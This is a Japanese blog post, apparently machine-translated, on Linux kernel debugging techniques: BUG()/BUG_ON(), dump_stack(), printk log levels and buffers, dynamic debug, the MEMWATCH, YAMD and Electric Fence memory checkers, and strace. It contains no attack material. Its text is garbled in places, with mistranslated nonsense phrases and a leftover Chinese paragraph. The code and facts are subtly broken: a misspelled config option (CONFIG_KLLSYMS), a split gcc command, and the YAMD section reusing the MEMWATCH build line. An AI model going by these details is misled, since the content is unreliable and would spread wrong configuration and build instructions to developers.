アトミック操作のデバッグ</h5><p>カーネル2.5から開発されたカーネルは、アトミック操作に起因するあらゆる種類の問題をチェックするための優れたツールを提供しています。<br>カーネルはアトミックオペレーションカウンターを提供しており、アトミックオペレーション中に着信都市がスリープしたり、スリープを引き起こすようなことをするとすぐに警告メッセージを表示し、トレースの手がかりを提供するよう設定することができる。<br>そのため、ロック中にschedule()を呼び出す、ロック中にブロッキングでメモリ割り当てを要求するなど、あらゆる潜在的なバグを検出することができる。<br>以下のオプションは、この機能を最大限に活用するものです。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_PREEMPT = y </span><br><span class="line"></span><br><span class="line">CONFIG_DEBUG_KERNEL = y </span><br><span class="line"></span><br><span class="line">CONFIG_KLLSYMS = y </span><br><span class="line"></span><br><span class="line">CONFIG_SPINLOCK_SLEEP = y</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="IV-バグを発生させる、メッセージを表示する"><a href="#IV-バグを発生させる、メッセージを表示する" class="headerlink" title="IV バグを発生させる、メッセージを表示する"></a>IV バグを発生させる、メッセージを表示する</h4><h5 id="1-BUG-およびBUG-ON"><a href="#1-BUG-およびBUG-ON" class="headerlink" title="1 BUG()およびBUG_ON()"></a>1 BUG()およびBUG_ON()</h5><p>多くのカーネルコールを使って、簡単にバグのフラグを立てたり、アサーションを提供したり、情報を出力したりすることができます。 よく使われるのはBUG()とBUG_ON()の2つです。</p><p>&lt;include&#x2F;asm-generic&gt; で定義されています。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ifndef HAVE_ARCH_BUG </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define BUG() do &#123; </span></span><br><span class="line"></span><br><span class="line">   printk(<span class="string">&quot;BUG: failure at %s:%d/%s()! &quot;</span>, __FILE__, __LINE__, __FUNCTION__); </span><br><span class="line"></span><br><span class="line">   panic(<span class="string">&quot;BUG!&quot;</span>);   /* より深刻なエラーが発生し、エラーメッセージが表示されるだけでなく、システム全体がハングアップしてしまう */ </span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> (0) </span><br><span class="line"></span><br><span class="line"><span class="comment">#endif </span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#ifndef HAVE_ARCH_BUG_ON </span></span><br><span class="line"></span><br><span class="line">   <span class="comment">#define BUG_ON(condition) do &#123; if (unlikely(condition)) BUG(); &#125; while(0) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>この2つのマクロが呼び出されると、OOPSが発生し、スタックトレースバックとエラーメッセージが出力されます。<br>※ BUG_ON(bad_thing) のように、この2つの呼び出しをアサーションとして使用することが可能です。</p><h5 id="2-dump-stack"><a href="#2-dump-stack" class="headerlink" title="2  dump_stack()"></a>2  dump_stack()</h5><p>デバッグのために、スタック・トレースバックをターミナルに出力するだけでよい場合もあります。 そこで、dump_stack()を使用することができます。 この関数は、レジスタコンテキストと関数のトレースバックトレイルのみをターミナルに表示します。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (!debug_check) &#123; </span><br><span class="line"></span><br><span class="line">    printk(KERN_DEBUG “provide some information…/n”); </span><br><span class="line"></span><br><span class="line">    dump_stack(); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="v-printk"><a href="#v-printk" class="headerlink" title="v printk()"></a>v printk()</h4><p>カーネルが提供する書式印刷機能。</p><h5 id="1-printk関数のロバスト性"><a href="#1-printk関数のロバスト性" class="headerlink" title="1 printk関数のロバスト性"></a>1 printk関数のロバスト性</h5><p>堅牢性はprintkの最も受け入れられる品質の1つであり、カーネルはほとんどどこでも、いつでも（割り込みコンテキスト、プロセスコンテキスト、ロック保持時、マルチプロセッシング時など）呼び出すことができます。</p><p>#####2 printk関数の脆弱性<br> システムのブートプロセスでは、ターミナルが初期化されるまで呼び出すことができない場所があります。 どうしてもシステム起動時の一番最初のデバッグが必要な場合は、以下の方法があります。</p><p>他の端末機器にデバッグ情報を出力する、シリアルデバッグを使用する。</p><p>システム起動の早い段階で印刷する機能を持つearly_printk()を使用します。 ただし、一部のハードウェアシステムにしか対応していない。</p><p>#####3 LOGレベル<br> printkとprintfの大きな違いは、前者がLOGレベルを指定できることです。 カーネルは、このレベルを使用して、端末にメッセージを印刷するかどうかを決定します。 カーネルは、指定されたレベルより高いメッセージをすべてターミナルに表示します。<br>       LOGレベルは、以下のように指定することができる。<br>printk(KERN_CRIT “Hello, world!\n”);<br>最初のパラメータは、レベル (KERN_CRIT) をフォーマット文字から分離するためのカンマ (,) が入っていないので、本当のパラメータではないことに注意。 kern_crit 自体は単なる普通の文字列である ( 実際には、文字列 “&lt;2&gt;” を表す。ログレベルの全リストは、表 1 に示されている )。 C言語では、プリプロセッサの一部として、文字列連結と呼ばれる関数を使って、この2つの文字列を自動的に結合する。 この組み合わせにより、ログレベルとユーザが指定したフォーマット文字列が一つの文字列として含まれることになる。</p><p>カーネルは、この指定されたLOGレベルと現在の端末LOGレベル console_loglevel を用いて、端末に印刷するかどうかを決定する。<br>LOGレベルは以下の通りです。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#define KERN_EMERG      &quot;&lt;0&gt;&quot;   /* system is unusable                            */</span><br><span class="line"></span><br><span class="line">#define KERN_ALERT        &quot;&lt;1&gt;&quot;   /* action must be taken immediately     */ </span><br><span class="line"></span><br><span class="line">#define KERN_CRIT           &quot;&lt;2&gt;&quot;   /* critical conditions                                */</span><br><span class="line"></span><br><span class="line">#define KERN_ERR            &quot;&lt;3&gt;&quot;   /* error conditions                                   */</span><br><span class="line"></span><br><span class="line">#define KERN_WARNING  &quot;&lt;4&gt;&quot;   /* warning conditions                              */</span><br><span class="line"></span><br><span class="line">#define KERN_NOTICE       &quot;&lt;5&gt;&quot;   /* normal but significant condition         */</span><br><span class="line"></span><br><span class="line">#define KERN_INFO            &quot;&lt;6&gt;&quot;   /* informational                                       */</span><br><span class="line"></span><br><span class="line">#define KERN_DEBUG        &quot;&lt;7&gt;&quot;   /* debug-level messages                       */</span><br><span class="line"></span><br><span class="line">#define KERN_DEFAULT     &quot;&lt;d&gt;&quot;   /* Use the default kernel loglevel           */</span><br></pre></td></tr></table></figure><p>呼び出し元が printk にログレベルを提供しない場合、デフォルト値 KERN_WARNING “&lt;4&gt;” が使用されることに注意してください (KERN_WARNING レベル以上のログメッセージのみがログ収集されることを示します)。 デフォルト値にはばらつきがあるため、使用する際はLOGレベルを指定した方が良い。 例えば、通常は KERN_WARNING レベル以上の重要な LOG を出力する必要がありますが、デバッグ時には KERN_DEBUG レベル以上の詳細な LOG を出力するように選択することができます。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mtj@ubuntu :~$ cat /proc/sys/kernel/printk</span><br><span class="line"></span><br><span class="line">4 4 1 7</span><br><span class="line"></span><br><span class="line">mtj@ubuntu :~$ cat /proc/sys/kernel/printk_delay</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">mtj@ubuntu :~$ cat /proc/sys/kernel/printk_ratelimit</span><br><span class="line"></span><br><span class="line">5</span><br><span class="line"></span><br><span class="line">mtj@ubuntu :~$ cat /proc/sys/kernel/printk_ratelimit_burst</span><br><span class="line"></span><br><span class="line">10</span><br></pre></td></tr></table></figure><p>最初の項目は、printk API で現在使用されているロギングレベルを定義します。 これらのロギングレベルは、コンソールロギングレベル、デフォルトメッセージロギングレベル、最小コンソールロギングレベル、デフォルトコンソールロギングレベルを表す。 printk_delay 値は、printkメッセージ間の遅延ミリ秒数（いくつかのシナリオで読みやすくするために使用される）を表わす。 printk_ratelimit は、メッセージ間の許容最小時間間隔を定義します (現在、5 秒間に一定数のカーネルメッセージを送信すると定義されています)。 メッセージ数は printk_ratelimit_burst で定義される（現在 10 と定義されている）。 これは、非公式カーネルを使用していて、帯域幅に制限のあるコンソールデバイス（シリアルポート経由など）を使用している場合に有効です。 カーネルでは、速度制限は呼び出し側で制御され、printkには実装されていないことに注意してください。 printk ユーザーが速度制限を要求する場合、そのユーザーは printk_ratelimit 関数を呼び出す必要があります。</p><p>#####4 レコードバッファ</p><p>  カーネルメッセージは、LOG_BUF_LENサイズのリングキューに格納される。<br>  LOG_BUF_LENの定義について。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define __LOG_BUF_LEN (1 &lt;&lt; CONFIG_LOG_BUF_SHIFT)</span><br></pre></td></tr></table></figure><ul><li>CONFIG_LOG_BUF_SHIFT はカーネルコンパイル時に設定ファイルによって定義され、 i386 プラットフォームではその値は以下のように定義されています (linux26&#x2F;arch&#x2F;i386&#x2F;defconfig 内)。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_LOG_BUF_SHIFT=18</span><br></pre></td></tr></table></figure> バッファの操作を記録する。<br>  ユーザースペースにメッセージが読み出されると、このメッセージはリングキューから削除されます。<br>  メッセージ・バッファが一杯になったとき、別のprintk()呼び出しがあると、新しいメッセージはキュー内の古いメッセージを上書きします。<br>  リングキューへの読み書きを行う場合、同期の問題は簡単に解決されます。</li></ul><p>  このレコードバッファは、読み出し、書き込みともにリングキューで運用されるため、リングと呼ばれています。</p><p>#####5  syslogd&#x2F;klogd<br>標準的なLinuxシステムでは、ユーザースペースデーモンであるklogdは、 レコードバッファからカーネルメッセージを取得し、syslogdデーモン経由でシステム ログファイルに保存します。klogdプロセスは、&#x2F;proc&#x2F;kmsgファイルまたはsyslog() システムコールからメッセージを読み込むことが可能です。 デフォルトでは、&#x2F;procの実装方法を選択します。klogdデーモンは、メッセージバッファに新しいメッセージが利用可能になるまでブロックしたままになります。 新しいカーネルメッセージが利用可能になると、klogdは起動され、カーネルメッセージを読み込んで処理します。 デフォルトでは、処理ルーチンはカーネルメッセージをsyslogdデーモンに渡し、syslogdは通常、受信したメッセージを&#x2F;var&#x2F;log&#x2F;messagesファイルに書き込みます。 ただし、&#x2F;etc&#x2F;syslog.conf ファイルによる設定は可能であり、他の出力ファイルを選択することもできます。</p><p><img src="/../../../img/linux_kernel_debug/syslogd_klogd.jpg" alt="avatar"></p><p>#####6  dmesg</p><p>dmesgコマンドは、カーネルリングバッファーの表示と制御にも使用できます。 このコマンドは、klogctlシステムコールを使用して、カーネルリングバッファーを読み、標準出力（stdout）に転送します。 このコマンドは、カーネルリングバッファーのクリア（-c オプション）、コンソールログレベルの設定（-n オプション）、カーネルログメッセージを読むためのバッファーのサイズの定義（-s オプション）にも使用することができます。 バッファサイズが指定されていない場合、dmesg は klogctl の SYSLOG_ACTION_SIZE_BUFFER 操作を使用して、バッファサイズを決定することに注意してください。</p><p>#####7 注意<br>a) printkは非常に堅牢ですが、ソースコードを読めば、この関数が非常に非効率的であることがわかります。 そのため、ドライバがパフォーマンステストやデバッグ後のリリースを行う場合は、printk出力を最小限に抑え、エラーが発生した場合にのみ少量の情報を出力することを忘れないようにしてください。 さもないと、無駄な情報をコンソールに出力することになり、パフォーマンスに影響が出ます。<br>b) printk の一時キャッシュ printk_buf は 1K しかなく、すべての printk 関数はログバッファに &lt;1K の情報しか記録できず、printk は “ringbuffer” を使用します。</p><p>#####8 カーネルプリントクとロギングシステムの一般的な構造<br><img src="/../../../img/linux_kernel_debug/syslogd_klogd.jpg" alt="avatar"></p><p>#####9 ダイナミックコミッショニング<br>ダイナミックデバッグは、特定のカーネルコードを動的に有効&#x2F;無効にすることで、カーネルの追加情報を取得するために使用されます。<br>まず、カーネルオプションCONFIG_DYNAMIC_DEBUGを設定する必要があります。 pr_debug()&#x2F;dev_debug()で出力されるすべての情報は、動的に表示するかしないかを選択できます。<br>表示する情報は、簡単なクエリ文によってフィルタリングすることができます。</p><p>-ソースファイル名</p><p>-関数名</p><p>-行番号(指定範囲の行番号を含む)</p><p>-モジュール名</p><p>-書式設定文字列</p><p><debugfs>&#x2F;dynamic_debug&#x2F;control に出力する情報のフォーマットを記述する。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nullarbor:~ # echo &#x27;file svcsock.c line 1603 +p&#x27; &gt;      &lt;debugfs&gt;/dynamic_debug/control</span><br></pre></td></tr></table></figure><p>####VI メモリデバッギングツール<br>#####1  MEMWATCH<br>MEMWATCHはJohan Lindhによって書かれた、オープンソースのC言語メモリエラー検出ツールで、自分でダウンロードすることができます。 コードにヘッダーファイルを追加し、gcc文でMEMWATCHを定義すると、プログラム中のメモリリークやエラーを追跡することができます。 unfreedmemory）、オーバーフロー、アンダーフローなど。</p><p>リスト1.メモリーサンプル（test1.c）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;memwatch.h&quot;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"> char *ptr1;</span><br><span class="line"> char *ptr2;</span><br><span class="line"> ptr1 = malloc(512);</span><br><span class="line"> ptr2 = malloc(512);</span><br><span class="line"> ptr2 = ptr1;</span><br><span class="line"> free(ptr2);</span><br><span class="line"> free(ptr1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>リスト1のコードでは、2つの512バイトのメモリブロックを割り当て、最初のブロックへのポインタが2番目のメモリブロックを指すように設定されます。 その結果、2番目のブロックのアドレスが失われ、メモリリークが発生します。<br>リスト1のmemwatch.cをコンパイルします。以下はmakefileの例です。<br>test1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -DMEMWATCH -DMW_STDIO test1.c memwatch</span><br><span class="line">c -o test1</span><br></pre></td></tr></table></figure><p>当您运行 test1 程序后，它会生成一个关于泄漏的内存的报告。清单 2 展示了示例 memwatch.log 输出文件。 </p><p>清单 2. test1 memwatch.log 文件</p><pre><code>MEMWATCH 2.67 Copyright (C) 1992-1999 Johan Lindh...double-free: &lt;4&gt; test1.c(15), 0x80517b4 was freed from test1.c(14)...unfreed: &lt;2&gt; test1.c(11), 512 bytes at 0x80519e4&#123;FE FE FE FE FE FE FE FE FE FE FE FE ..............&#125;Memory usage statistics (global): N)umber of allocations made: 2 L)argest memory usage : 1024 T)otal of all alloc() calls: 1024 U)nfreed bytes totals : 512</code></pre><p> MEMWATCHは、実際に問題を起こしている行を表示します。 すでに解放されているポインタを解放すると、それを教えてくれます。 解放されていないメモリも同様です。 ログの最後には、どれだけメモリが漏れたか、どれだけメモリが使われたか、合計でどれだけメモリが割り当てられたかなどの統計が表示されます。</p><h5 id="2-YAMD"><a href="#2-YAMD" class="headerlink" title="2  YAMD"></a>2  YAMD</h5><p>YAMD パッケージは、C および C++における動的なメモリ割り当て関連の問題を発見するために Nate Eldredge によって書かれたものである。 yamd-0.32.tar.gz をダウンロードし、make コマンドを実行してプログラムをビルドし、 make install コマンドを実行してプログラムをインストールし、ツールをセットアップする。<br>YAMDをダウンロードしたら、test1.cで使用します。 #include memwatch.h を削除し、makefile に以下のような細かい変更を加えます。</p><p>YAMDを使ったテスト1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -DMEMWATCH -DMW_STDIO test1.c memwatch</span><br><span class="line">c -o test1</span><br></pre></td></tr></table></figure><h5 id="2-YAMD-1"><a href="#2-YAMD-1" class="headerlink" title="2  YAMD"></a>2  YAMD</h5><p>リスト 3 は test1 の YAMD からの出力です。</p><p>リスト3.YAMDを使ったtest1の出力</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">YAMD version 0.32</span><br><span class="line"></span><br><span class="line">Executable: /usr/src/test/yamd-0.32/test1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">INFO: Normal allocation of this block</span><br><span class="line"></span><br><span class="line">Address 0x40025e00, size 512</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">INFO: Normal allocation of this block</span><br><span class="line"></span><br><span class="line">Address 0x40028e00, size 512</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">INFO: Normal deallocation of this block</span><br><span class="line"></span><br><span class="line">Address 0x40025e00, size 512</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ERROR: Multiple freeing At</span><br><span class="line"></span><br><span class="line">free of pointer already freed</span><br><span class="line"></span><br><span class="line">Address 0x40025e00, size 512</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">WARNING: Memory leak</span><br><span class="line"></span><br><span class="line">Address 0x40028e00, size 512</span><br><span class="line"></span><br><span class="line">WARNING: Total memory leaks:</span><br><span class="line"></span><br><span class="line">1 unfreed allocations totaling 512 bytes</span><br><span class="line"></span><br><span class="line">*** Finished at Tue ... 10:07:15 2002</span><br><span class="line"></span><br><span class="line">Allocated a grand total of 1024 bytes 2 allocations</span><br><span class="line"></span><br><span class="line">Average of 512 bytes per allocation</span><br><span class="line"></span><br><span class="line">Max bytes allocated at one time: 1024</span><br><span class="line"></span><br><span class="line">24 K alloced internally / 12 K mapped now / 8 K max</span><br><span class="line"></span><br><span class="line">Virtual program size is 1416 K</span><br><span class="line"></span><br><span class="line">End.</span><br></pre></td></tr></table></figure><p>MEMWATCHとYAMDはどちらも便利なデバッグツールですが、その使い方は様々です。 MEMWATCHの場合、インクルードファイルmemwatch.hを追加し、2つのコンパイル時タグをオンにする必要があります。 リンク文の場合、YAMD は -g オプションのみを必要とします。</p><p>#####3  Electric Fence<br>electric Fence は Bruce Perens 氏によって書かれた malloc() デバッギングライブラリで、ほとんどの Linux ディストリビューションには Electric Fence パッケージが含まれていますが、ダウンロードすることも可能です。 保護されたメモリを割り当てた直後に、そのメモリが割り当てられるのです。 フェンスポストエラー（配列の終端を超えて実行）が発生した場合、プログラムはプロテクトエラーを発生し、直ちに終了します。 Electric Fenceとgdbを組み合わせることで、どの行が保護されたメモリにアクセスしようとしているかを正確に追跡することができる。ElectricFenceのもう一つの特徴は、メモリリークを検出する機能である。</p><p>####VIIストレース<br>strace コマンドは、ユーザースペースプログラムが発行するすべてのシステムコールを表示する強力なツールです。strace はこれらのコールに対する引数を表示し、シンボル形式で値を返します。strace はカーネルから情報を受け取り、特別な方法でカーネルを構築する必要はありません。 アプリケーションやカーネル開発者にもトレース情報を送ることができ、便利です。 リスト 6 では、パーティション形式の 1 つにエラーがあり、リストには、ファイルシステムの作成操作 (mkfs) を呼び出すことに関する strace の始まりが示されています。strace は、どの呼び出しが問題を引き起こしているかを判断しています。<br>リストアップ<br>6. mkfs の strace の開始。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/sbin/mkfs.jfs&quot;, [&quot;mkfs.jfs&quot;, &quot;-f&quot;, &quot;/dev/test1&quot;], &amp;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">open(&quot;/dev/test1&quot;, O_RDWR|O_LARGEFILE) = 4</span><br><span class="line"></span><br><span class="line">stat64(&quot;/dev/test1&quot;, &#123;st_mode=&amp;, st_rdev=makedev(63, 255), ...&#125;) = 0</span><br><span class="line"></span><br><span class="line">ioctl(4, 0x40041271, 0xbfffe128) = -1 EINVAL (Invalid argument)</span><br><span class="line"></span><br><span class="line">write(2, &quot;mkfs.jfs: warning - cannot setb&quot; ..., 98mkfs.jfs: warning -</span><br><span class="line"></span><br><span class="line">cannot set blocksize on block device /dev/test1: Invalid argument )</span><br><span class="line"></span><br><span class="line"> = 98</span><br><span class="line"></span><br><span class="line">stat64(&quot;/dev/test1&quot;, &#123;st_mode=&amp;, st_rdev=makedev(63, 255), ...&#125;) = 0</span><br><span class="line"></span><br><span class="line">open(&quot;/dev/test1&quot;, O_RDONLY|O_LARGEFILE) = 5</span><br><span class="line"></span><br><span class="line">ioctl(5, 0x80041272, 0xbfffe124) = -1 EINVAL (Invalid argument)</span><br><span class="line"></span><br><span class="line">write(2, &quot;mkfs.jfs: can\&#x27;t determine device&quot;..., ..._exit(1)</span><br><span class="line"></span><br><span class="line"> = ?</span><br></pre></td></tr></table></figure><p>リスト6では、ioctlの呼び出しによって、パーティションをフォーマットするために使用されるmkfsプログラムが失敗することが示されています。ioctl BLKGETSIZE64 に失敗しました。 (BLKGET-SIZE64はioctlを呼び出すソースコードで定義されています)。BLKGETSIZE64 ioctl は、論理ボリューム・マネージャーでまだサポートされていない Linux のすべてのデバイスに追加されます。 そのため、BLKGETSIZE64 ioctlコールが失敗した場合、mkfsコードは代わりに以前のioctlコールを呼び出すことになります。</p><p>####VIII OOPS</p><p><a href="https://www.cnblogs.com/alantu2018/p/8997149.html">https://www.cnblogs.com/alantu2018/p/8997149.html</a></p>]]></content>
      
      
      <categories>
          
          <category> linux kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux kernel </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
